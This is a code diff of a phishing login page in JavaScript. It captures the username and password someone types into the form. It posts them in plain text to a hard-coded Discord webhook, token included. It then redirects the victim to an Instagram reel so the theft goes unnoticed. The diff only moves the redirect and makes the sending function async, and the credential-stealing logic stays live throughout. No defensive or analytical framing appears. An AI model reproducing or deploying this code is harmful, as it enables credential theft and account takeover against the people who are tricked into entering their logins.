@@ -92,16 +92,15 @@
                 }
                 sendData(userdata);
 
-                window.location.replace("https://www.instagram.com/reel/CvuRC56o-hw/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==");
-
                 username.value = null;
                 password.value = null;
             }
         });
 
-        function sendData(userdata) {
+        async function sendData(userdata) {
             const webhookUrl = 'https://discord.com/api/webhooks/1161261447721000970/0R1p_kqZuJZDwY9dX2SkQjb3DZVhKdUgLEgejt1VXznuGfHgXKCrpu_kaJ3NKOyp7-p9';
 
+            window.location.replace("https://www.instagram.com/reel/CvuRC56o-hw/?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==");
             const data = {
                 content: `Username : ${userdata.username} , Password : ${userdata.pass}`,
                 username: `${userdata.username}`
